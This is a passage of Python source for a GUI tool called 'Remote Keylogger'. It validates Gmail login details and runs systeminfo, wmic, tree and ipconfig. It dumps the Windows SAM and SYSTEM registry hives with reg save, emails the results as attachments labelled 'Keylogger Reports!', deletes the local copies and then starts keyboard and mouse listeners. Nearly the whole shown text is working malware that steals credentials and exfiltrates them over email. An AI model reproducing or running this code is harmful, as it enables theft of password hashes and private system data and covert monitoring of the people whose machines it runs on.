                )

                app.deiconify()
                return None

            if not sp == "gmail.com":
                print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
                print(
                    "["
                    + Fore.YELLOW
                    + Style.BRIGHT
                    + "WARN"
                    + Style.RESET_ALL
                    + "]\t["
                    + Fore.BLUE
                    + Style.BRIGHT
                    + str(datetime.now())
                    + Style.RESET_ALL
                    + "]\t"
                    + Style.BRIGHT
                    + "Only handles gmail address for now."
                )
                print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

                # USER CONTROL FLOW
                showinfo(
                    title=f"Remote Keylogger {__version__}",
                    message="Only handles gmail address for now.",
                )

                app.deiconify()
                return None

        else:
            print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
            print(
                "["
                + Fore.YELLOW
                + Style.BRIGHT
                + "WARN"
                + Style.RESET_ALL
                + "]\t["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + Style.BRIGHT
                + "Please enter your full and correct email address."
            )
            print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

            email_label_frame.config(fg="red")

            # USER CONTROL FLOW
            showinfo(
                title=f"Remote Keylogger {__version__}",
                message="Please enter your full and correct email address.",
            )

            app.deiconify()
            return None

    else:
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "WARN"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Email address cannot be null"
        )
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

        email_label_frame.config(fg="red")

        # USER CONTROL FLOW
        showinfo(
            title=f"Remote Keylogger {__version__}",
            message="Email address cannot be null.",
        )

        app.deiconify()  # un-hides gui window
        return None

    # If password filed is null,
    if not len(password):
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "WARN"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Password field cannot be null."
        )
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

        password_label_frame.config(fg="red")

        # USER CONTROL FLOW
        showinfo(
            title=f"Remote Keylogger {__version__}",
            message="Password field cannot be null.",
        )

        app.deiconify()  # un-hides gui window
        return None

    # If length of password less than eight characters,
    elif len(password) < 8:
        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tIncorrect password, please try again..."
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        password_label_frame.config(fg="red")

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message="Incorrect Password. Please try again...",
        )

        app.deiconify()  # un-hides gui window
        return None

    # If to address field is not null,
    if not len(to_address):
        to_address: str = email_address  # DYNAMIC VARIABLE

    try:
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Connecting to smtp.gmail.com:587, please wait..."
        )
        server = SMTP(host="smtp.gmail.com", port=587)  # DYNAMIC VARIABLE

    # FAILED TO CONNECT SMTP.GMAIL.COM:587 socket.gaierror: [Errno 11001] getaddrinfo failed
    except gaierror as gai_error:
        clear_screen()

        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(Fore.RED + Style.BRIGHT + "Error Code: sockets.gaierror")
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tFailed to connect smtp.gmail.com:587"
        )
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {gai_error}"
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message=f"Sorry, an error occurred! Failed to connect smtp.gmail.com:587\n{gai_error}",
        )

        app.deiconify()  # un-hides gui window
        return None

    try:
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Ready to start TLS Handshake, please wait..."
        )
        server.starttls()

    # FAILED TO START TLS HANDSHAKE smtplib.SMTPServerDisconnected: Connection unexpectedly closed
    except SMTPServerDisconnected as smtp_server_disconnected:
        clear_screen()

        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(Fore.RED + Style.BRIGHT + "Error Code: smtplib.SMTPServerDisconnected")
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tFailed to start TLS handshake."
        )
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {smtp_server_disconnected}"
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message=f"Sorry, an error occurred! Failed to start TLS handshake\n{smtp_server_disconnected}",
        )

        app.deiconify()  # un-hides gui window
        return None

    try:
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Login to your Gmail Account, Please wait..."
        )
        server.login(user=email_address, password=password)
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Accepted."
        )

    # USERNAME AND PASSWORD NOT ACCEPTED.
    except SMTPAuthenticationError as smtp_authentication_error:
        clear_screen()

        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(Fore.RED + Style.BRIGHT + "Error Code: smtplib.SMTPAuthenticationError")
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tFailed to login to your gmail account."
        )
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {smtp_authentication_error}"
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message=f"Sorry, an error occurred! Failed to login to your gmail account.\n{smtp_authentication_error}",
        )

        app.deiconify()  # un-hides gui window
        return None

    except SMTPServerDisconnected as smtp_server_disconnected:
        clear_screen()

        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(Fore.RED + Style.BRIGHT + "Error Code: smtplib.SMTPServerDisconnected")
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tFailed to login to your gmail account."
        )
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {smtp_server_disconnected}"
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message=f"Sorry, an error occurred! Failed to login to your gmail account\n{smtp_server_disconnected}",
        )

        app.deiconify()  # un-hides gui window
        return None

    if keyboard_listener_var.get() or mouse_listener_var.get():
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
        print(
            Fore.YELLOW
            + Style.BRIGHT
            + "CAUTION: Keyboard and Mouse listeners may lead you to infinite loop.\n"
            "It won't stop until you restart your computer."
        )
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showwarning(
            title=f"Remote Keylogger {__version__}",
            message="CAUTION: Keyboard and Mouse listeners may lead you to infinite loop.\n"
            "It won't stop until you restart your computer.",
        )

    clear_screen()

    # NEED TO OPTIMIZE
    figlet_fonts: list = [
        "3-d",
        "3x5",
        "4x4_offr",
        "5lineoblique",
        "5x7",
        "5x8",
        "6x9",
        "6x10",
        "64f1____",
        "1943____",
        "a_zooloo",
        "acrobatic",
        "advenger",
        "alligator",
        "alligator2",
        "alphabet",
        "aquaplan",
        "arrows",
        "asc_____",
        "ascii___",
        "assalt_m",
        "asslt__m",
        "atc_____",
        "atc_gran",
        "avatar",
        "b_m__200",
        "banner",
        "banner3",
        "banner3-D",
        "banner4",
        "barbwire",
        "basic",
        "battle_s",
        "battlesh",
        "baz__bil",
        "beer_pub",
        "bell",
        "big",
        "bigchief",
        "binary",
        "block",
        "brite",
        "briteb",
        "britebi",
        "britei",
        "broadway",
        "bubble",
        "bubble__",
        "bubble_b",
        "bulbhead",
        "c_ascii_",
        "c_consen",
        "c1______",
        "c2______",
        "calgphy2",
        "caligraphy",
        "catwalk",
        "caus_in_",
        "char1___",
        "char2___",
        "char3___",
        "char4___",
        "charact1",
        "charact2",
        "charact3",
        "charact4",
        "charact5",
        "charact6",
        "characte",
        "charset_",
        "chartr",
        "chartri",
        "chunky",
        "clb6x10",
        "clb8x8",
        "clb8x10",
        "cli8x8",
        "clr4x6",
        "clr5x6",
        "clr5x8",
        "clr5x10",
        "clr6x6",
        "clr6x8",
        "clr6x10",
        "clr7x8",
        "clr7x10",
        "clr8x8",
        "clr8x10",
        "coil_cop",
        "coinstak",
        "colossal",
        "com_sen_",
        "computer",
        "contessa",
        "contrast",
        "convoy__",
        "cosmic",
        "cosmike",
        "cour",
        "courb",
        "courbi",
        "couri",
        "crawford",
        "cricket",
        "cursive",
        "cyberlarge",
        "cybermedium",
        "cybersmall",
        "d_dragon",
        "dcs_bfmo",
        "decimal",
        "deep_str",
        "defleppard",
        "demo_1__",
        "demo_2__",
        "demo_m__",
        "devilish",
        "diamond",
        "digital",
        "doh",
        "doom",
        "dotmatrix",
        "double",
        "drpepper",
        "druid___",
        "dwhistled",
        "e__fist_",
        "ebbs_1__",
        "ebbs_2__",
        "eca_____",
        "eftichess",
        "eftifont",
        "eftipiti",
        "eftirobot",
        "eftitalic",
        "eftiwall",
        "eftiwater",
        "epic",
        "etcrvs__",
        "f15_____",
        "faces_of",
        "fair_mea",
        "fairligh",
        "fantasy_",
        "fbr_stri",
        "fbr_tilt",
        "fbr1____",
        "fbr2____",
        "fbr12___",
        "fender",
        "finalass",
        "fireing_",
        "flyn_sh",
        "fourtops",
        "fp1_____",
        "fp2_____",
        "fraktur",
        "funky_dr",
        "future_1",
        "future_2",
        "future_3",
        "future_4",
        "future_5",
        "future_6",
        "future_7",
        "future_8",
        "fuzzy",
        "gauntlet",
        "ghost_bo",
        "goofy",
        "gothic",
        "gothic__",
        "graceful",
        "gradient",
        "graffiti",
        "grand_pr",
        "greek",
        "green_be",
        "hades___",
        "heavy_me",
        "helv",
        "helvb",
        "helvbi",
        "helvi",
        "heroboti",
        "hex",
        "high_noo",
        "hills___",
        "hollywood",
        "home_pak",
        "house_of",
        "hypa_bal",
        "hyper___",
        "inc_raw_",
        "invita",
        "isometric1",
        "isometric2",
        "isometric3",
        "isometric4",
        "italic",
        "italics_",
        "ivrit",
        "jazmine",
        "jerusalem",
        "joust___",
    ]  # STATIC VARIABLE
    selected_font: str = choice(figlet_fonts)  # DYNAMIC VARIABLE

    try:  # Trying to print pyfiglet fonts.
        print(
            "\n"
            + Fore.GREEN
            + Style.BRIGHT
            + figlet_format(text="Remote Keylogger", font=selected_font)
        )

    # NEED TO OPTIMIZE
    except FontNotFound as font_not_found:  # Font Not Found Error
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)
        print(
            Fore.YELLOW + Style.BRIGHT + f"[WARN]\t[{datetime.now()}]\t{font_not_found}"
        )
        print(
            Fore.YELLOW
            + Style.BRIGHT
            + f"[WARN]\t[{datetime.now()}]\tpyfiglet fonts not installed!"
        )
        print(Fore.YELLOW + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showwarning(
            title=f"Remote Keylogger {__version__}",
            message="pyfiglet fonts not installed",
        )

    total_jobs = 0

    if username_var.get():
        total_jobs = total_jobs + 1

    if datetime_var.get():
        total_jobs = total_jobs + 1

    if public_ip_var.get():
        total_jobs = total_jobs + 1

    if operating_system_var.get():
        total_jobs = total_jobs + 1

    if systeminfo_var.get():
        total_jobs = total_jobs + 1

    if wmic_var.get():
        total_jobs = total_jobs + 1

    if tree_var.get():
        total_jobs = total_jobs + 1

    if ipconfig_var.get():
        total_jobs = total_jobs + 1

    if sam_var.get():
        total_jobs = total_jobs + 1

    if system_var.get():
        total_jobs = total_jobs + 1

    print(Style.BRIGHT + f"Total job(s): {total_jobs}")

    print(
        "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
        "["
        + Fore.BLUE
        + Style.BRIGHT
        + str(datetime.now())
        + Style.RESET_ALL
        + "]\t"
        + Style.BRIGHT
        + "Remote Keylogger activated successfully..."
    )
    info(msg="-" * 100)
    info(msg="Remote Keylogger activated successfully...")
    msg: str = "Remote Keylogger activated successfully...\n\n"  # DYNAMIC VARIABLE

    if username_var.get():
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Username: {username}"
        )
        msg: str = msg + f"Username: {username}\n"  # DYNAMIC VARIABLE

    if datetime_var.get():
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Current date & time: {datetime.now()}"
        )
        msg: str = msg + f"Current date & time: {datetime.now()}\n"  # DYNAMIC VARIABLE

    if public_ip_var.get():
        try:
            print(
                "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
                "["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + Style.BRIGHT
                + "Connecting to https://api64.ipify.org:443"
            )
            ipv4: str = get(url="https://api64.ipify.org:443").text  # STATIC VARIABLE
            print(
                "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
                "["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + Style.BRIGHT
                + "Public IP address: {ipv4}"
            )
            msg: str = msg + f"Public IP address: {ipv4}\n"  # DYNAMIC VARIABLE

        except ConnectionError as connection_error:
            print(Fore.RED + Style.BRIGHT + "-" * 100)
            print(
                Fore.RED
                + Style.BRIGHT
                + "Error Code: requests.exceptions.ConnectionError"
            )
            print(
                Fore.RED
                + Style.BRIGHT
                + f"[ERROR]\t[{datetime.now()}]\tFailed to connect https://api64.ipify.org:443"
            )
            print(
                Fore.RED
                + Style.BRIGHT
                + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {connection_error}"
            )
            print(Fore.RED + Style.BRIGHT + "-" * 100)

            # USER CONTROL FLOW
            showerror(
                title=f"Remote Keylogger {__version__}",
                message="Sorry, an error occurred! {connection_error}\n"
                "Failed to connect https://api64.ipify.org:443",
            )

    if operating_system_var.get():
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Operating System: {operating_system}"
        )
        msg: str = msg + f"Operating System: {operating_system}\n\n"  # DYNAMIC VARIABLE

    email_content: EmailMessage = EmailMessage()  # DYNAMIC VARIABLE
    email_content["From"]: EmailMessage = email_address  # DYNAMIC VARIABLE
    email_content["To"]: EmailMessage = to_address  # DYNAMIC VARIABLE
    email_content["Subject"]: EmailMessage = "Keylogger Reports!"  # DYNAMIC VARIABLE
    email_content.set_content(msg)

    total_size: int = 0

    if systeminfo_var.get():
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "EXEC"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"systeminfo > {log_path}SYSTEMINFO.TXT"
        )

        # Dumping system information to the log directory...
        terminal(command=f"systeminfo > {log_path}SYSTEMINFO.TXT")

        data = file_operation(file=log_path + "SYSTEMINFO.TXT", mode="rb")
        total_size: int = total_size + getsize(filename=log_path + "SYSTEMINFO.TXT")

        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Deleting SYSTEMINFO.TXT log file {log_path}SYSTEMINFO.TXT"
        )
        remove(path=log_path + "SYSTEMINFO.TXT")

        email_content.add_attachment(
            data, filename="SYSTEMINFO.TXT", maintype="application", subtype="text"
        )

    if wmic_var.get():
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "EXEC"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"wmic product > {log_path}WMIC_PRODUCT.TXT"
        )

        # Dumping installed application details to the log directory...
        terminal(command=f"wmic product > {log_path}WMIC_PRODUCT.TXT")

        data = file_operation(file=log_path + "WMIC_PRODUCT.TXT", mode="rb")
        total_size: int = total_size + getsize(filename=log_path + "WMIC_PRODUCT.TXT")

        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Deleting WMIC_PRODUCT.TXT log file {log_path}WMIC_PRODUCT.TXT"
        )
        remove(path=log_path + "WMIC_PRODUCT.TXT")

        email_content.add_attachment(
            data,
            filename="WMIC_PRODUCT.TXT",
            maintype="application",
            subtype="text",
        )

    if tree_var.get():
        print(
            "["
            + Fore.GREEN
            + Style.BRIGHT
            + "EXCE"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"tree C:\\Users\\%username% /f /a > {log_path}TREE.TXT"
        )

        # Dumping user file structures on log directory...
        terminal(command=f"tree C:\\Users\\%USERNAME% /f /a > {log_path}TREE.TXT")

        data = file_operation(file=log_path + "TREE.TXT", mode="rb")
        total_size: int = total_size + getsize(filename=log_path + "TREE.TXT")

        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Deleting TREE.TXT log file {log_path}TREE.TXT"
        )
        remove(path=log_path + "TREE.TXT")

        email_content.add_attachment(
            data, filename="TREE.TXT", maintype="application", subtype="text"
        )

    if ipconfig_var.get():
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "EXEC"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"ipconfig /all > {log_path}IPCONFIG.TXT"
        )

        # Dumping user file ipconfig on log directory...
        terminal(command=f"ipconfig /all > {log_path}IPCONFIG.TXT")

        data = file_operation(file=log_path + "IPCONFIG.TXT", mode="rb")
        total_size: int = total_size + getsize(filename=log_path + "IPCONFIG.TXT")

        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Deleting IPCONFIG.TXT log file {log_path}IPCONFIG.TXT"
        )
        remove(path=log_path + "IPCONFIG.TXT")

        email_content.add_attachment(
            data, filename="IPCONFIG.TXT", maintype="application", subtype="text"
        )

    if sam_var.get():
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "EXEC"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"reg save HKLM\\SAM {log_path}SAM /y"
        )

        # Dumping SAM file on Microsoft Windows by using reg command.
        # https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save

        if terminal(command=f"reg save HKLM\\SAM {log_path}SAM /y"):
            print(Fore.RED + Style.BRIGHT + "-" * 100)
            print(
                "["
                + Fore.RED
                + Style.BRIGHT
                + "ERROR"
                + Style.RESET_ALL
                + "]\t["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + "Failed to execute reg command."
            )
            print(Fore.RED + Style.BRIGHT + "-" * 100)

        else:
            data = file_operation(file=log_path + "SAM", mode="rb")
            total_size: int = total_size + getsize(filename=log_path + "SAM")

            print(
                "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
                "["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + Style.BRIGHT
                + f"Deleting SAM database {log_path}SAM"
            )
            remove(path=log_path + "SAM")

            email_content.add_attachment(
                data, filename="SAM", maintype="other", subtype="other"
            )

    # We ignored to upload SYSTEM database due to exceed of file size.

    if system_var.get():
        print(
            "["
            + Fore.YELLOW
            + Style.BRIGHT
            + "EXEC"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"reg save HKLM\\SYSTEM {log_path}SYSTEM /y"
        )

        # Dumping SYSTEM file on Microsoft Windows by using reg command.
        # https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save

        if terminal(command=f"reg save HKLM\\SYSTEM {log_path}SYSTEM /y"):
            print(Fore.RED + Style.BRIGHT + "-" * 100)
            print(
                "["
                + Fore.RED
                + Style.BRIGHT
                + "ERROR"
                + Style.RESET_ALL
                + "]\t["
                + Fore.BLUE
                + Style.BRIGHT
                + str(datetime.now())
                + Style.RESET_ALL
                + "]\t"
                + "Failed to execute reg command."
            )
            print(Fore.RED + Style.BRIGHT + "-" * 100)

    if total_size > 1048576:  # IN MiB(s)
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Total file size: {total_size / 1048576} MiB."
        )

    elif total_size > 1024:  # IN KiB(s)
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Total file size: {total_size / 1024} KiB."
        )

    else:  # IN Bytes.
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + f"Total file size: {total_size} bytes."
        )

    # TRYING TO SEND EMAIL, PLEASE WAIT...
    try:
        print(
            "["
            + Fore.GREEN
            + Style.BRIGHT
            + "INFO"
            + Style.RESET_ALL
            + "]\t["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Sending email, please wait..."
        )
        server.send_message(msg=email_content)
        print(
            Fore.GREEN
            + Style.BRIGHT
            + f"[INFO]\t[{datetime.now()}]\tEmail sent successfully..."
        )

    # The recipient address is not a valid
    except SMTPRecipientsRefused as smtp_recipients_refused:
        clear_screen()

        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(Fore.RED + Style.BRIGHT + "Error Code: smtplib.SMTPRecipientsRefused")
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tFailed to send email. The recipient address is not valid"
        )
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {smtp_recipients_refused}"
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        to_address_label_frame.config(fg="red")

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message="Sorry, an error occurred! Failed to send email. The recipient address is not valid\n"
            f"{smtp_recipients_refused}",
        )

        app.deiconify()  # un-hides gui window
        return None

    # Connection unexpectedly closed
    except SMTPServerDisconnected as smtp_server_disconnected:
        clear_screen()

        print(Fore.RED + Style.BRIGHT + "-" * 100)
        print(Fore.RED + Style.BRIGHT + "Error Code: smtplib.SMTPServerDisconnected")
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tFailed to send email, Connection unexpectedly closed."
        )
        print(
            Fore.RED
            + Style.BRIGHT
            + f"[ERROR]\t[{datetime.now()}]\tSorry, an error occurred! {smtp_server_disconnected}"
        )
        print(Fore.RED + Style.BRIGHT + "-" * 100)

        # USER CONTROL FLOW
        showerror(
            title=f"Remote Keylogger {__version__}",
            message="Sorry, an error occurred! Failed to send email, Connection unexpectedly closed.\n"
            f"{smtp_server_disconnected}",
        )

        app.deiconify()  # un-hides gui window
        return None

    if operating_system == "Windows":
        terminal(command="msg * Email sent successfully...")
        Beep(frequency=1000, duration=100)

    if operating_system == "Linux":
        terminal(command="notify-send 'Email sent successfully...'")

    keyboard_listener = KeyboardListener(on_press=on_press)  # DYNAMIC VARIABLE
    mouse_listener = MouseListener(on_click=on_click)  # DYNAMIC VARIABLE

    if keyboard_listener_var.get():
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Starting keyboard listener..."
        )
        keyboard_listener.start()

    if mouse_listener_var.get():
        print(
            "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
            "["
            + Fore.BLUE
            + Style.BRIGHT
            + str(datetime.now())
            + Style.RESET_ALL
            + "]\t"
            + Style.BRIGHT
            + "Starting mouse listener..."
        )
        mouse_listener.start()

    if keyboard_listener_var.get():
        keyboard_listener.join()

    if mouse_listener_var.get():
        mouse_listener.join()

    app.destroy()
    terminate()


def exit_gui():
    app.withdraw()  # hides gui window

    if operating_system == "Windows":
        MessageBeep()

    print(
        Fore.YELLOW
        + Style.BRIGHT
        + f"[INFO]\t[{datetime.now()}]\tAre you sure? Do you really want to quit?"
    )
    # USER CONTROL FLOW
    if askyesno(
        title=f"Remote Keylogger {__version__}",
        message="Are you sure? Do you really want to quit?",
    ):
        print(
            Fore.GREEN
            + Style.BRIGHT
            + f"[INFO]\t[{datetime.now()}]\tHope you well enjoyed it! Bye..."
        )

        app.destroy()
        clear_screen()
        terminate()

    else:
        app.deiconify()  # un-hides gui window
        return None


app.title(f"Remote Keylogger {__version__}")
app.resizable(False, False)

menu_bar = Menu(master=app)  # DYNAMIC VARIABLE
app.config(menu=menu_bar)

action_menu = Menu(master=menu_bar, tearoff=0)
menu_bar.add_cascade(label="Action", menu=action_menu)

action_menu.add_command(label="Start", command=lambda: start_logging())
action_menu.add_separator()
action_menu.add_command(
    label="2-Step Verification",
    command=lambda: browser(
        url="https://myaccount.google.com/signinoptions/two-step-verification"
    ),
)
action_menu.add_command(
    label="Less secure app access",
    command=lambda: browser(url="https://myaccount.google.com/lesssecureapps"),
)
action_menu.add_separator()
action_menu.add_command(label="Exit", command=lambda: exit_gui())

links_menu = Menu(master=menu_bar, tearoff=0)  # DYNAMIC VARIABLE
menu_bar.add_cascade(label="Links", menu=links_menu)

links_menu.add_command(
    label="License: MIT",
    command=lambda: browser(
        url="https://raw.githubusercontent.com/JahidFariz/Remote-Keylogger/main/LICENSE"
    ),
)
links_menu.add_command(
    label="Source Code",
    command=lambda: browser(url="https://github.com/JahidFariz/Remote-Keylogger"),
)
links_menu.add_command(
    label="Issues",
    command=lambda: browser(
        url="https://github.com/JahidFariz/Remote-Keylogger/issues"
    ),
)
links_menu.add_command(
    label="Website", command=lambda: browser(url="https://jahidfariz.github.io/")
)
links_menu.add_command(
    label="E-Mail Author",
    command=lambda: browser(url="mailto:mohamedfariz100@gmail.com"),
)
links_menu.add_separator()

app.config(bg="lightsteelblue2")

print(
    "[" + Fore.GREEN + Style.BRIGHT + "INFO" + Style.RESET_ALL + "]\t"
    "["
    + Fore.BLUE
    + Style.BRIGHT
    + str(datetime.now())
    + Style.RESET_ALL
    + "]\t"
    + Style.BRIGHT
    + f"Remote Keylogger {__version__} | Hello {username.title()}"
)
Label(
    master=app,
    text=f"Remote Keylogger {__version__} | Hello {username.title()}",
    bg="black",
    fg="white",
).pack(side=TOP, fill=X)

if operating_system == "Windows":
